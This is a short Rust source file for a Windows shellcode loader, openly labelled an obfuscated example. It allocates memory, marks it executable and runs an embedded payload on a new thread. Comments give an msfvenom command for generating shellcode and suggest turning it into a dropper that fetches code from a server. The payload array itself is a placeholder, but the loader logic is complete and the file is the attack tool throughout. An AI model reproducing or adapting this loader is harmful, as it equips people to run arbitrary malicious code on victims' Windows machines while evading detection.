// Stripped & obsf Example
//not handling failures yet. 

use std::process::exit;
use std::ptr::{copy, null_mut};
//use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;

fn main() {
    // Generating sample calc shellcode using metasploit
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    let shellcode: [u8; //LENGTH_OF_SHELLCODE] = [
        //SHELLCODE, maybe macro replace? or reach out to server or soemthing for dropper
    ];

    unsafe {
        let shellcode_addr = VirtualAlloc(
            null_mut(),                   // address hint (nullptr means the system chooses the address)
            shellcode.len(),              // size of the memory block
            MEM_COMMIT | MEM_RESERVE,     // allocation type
            PAGE_READWRITE,               // memory protection
        );

        // checking if memory allocation was successful
        if shellcode_addr.is_null() {
            exit(0x00);
        }

        copy(shellcode.as_ptr(), shellcode_addr as *mut u8, shellcode.len());

        let mut old_protection = 0;

        let virtualprotect = VirtualProtect(
            shellcode_addr, // Starting Page Address
            shellcode.len(), // Shellcode size
            PAGE_EXECUTE_READWRITE, // Memory protection Option. Can move to PAGE_EXECUTE_READ if the code doesn't modify mem in any way 
            &mut old_protection // Previous protection
        );

        if virtualprotect == 0 {
            exit(0x00);
        }

        let hthread = CreateThread(
            null_mut(),                   // Security attributes
            0,                                  // Stack size (0 means default)
            Some(std::mem::transmute(shellcode_addr)),  // Thread start address
            null_mut(),                         // Thread parameter
            0,                              // Creation flags
            null_mut(),                         // Thread ID
        );

        if hthread.is_null() {
            exit(0x00);
        }

        // waiting for the created thread to finish execution
        WaitForSingleObject(hthread, 0xFFFFFFFF); // 0xFFFFFFFF means to wait for INFINITE times ..!
    }
}
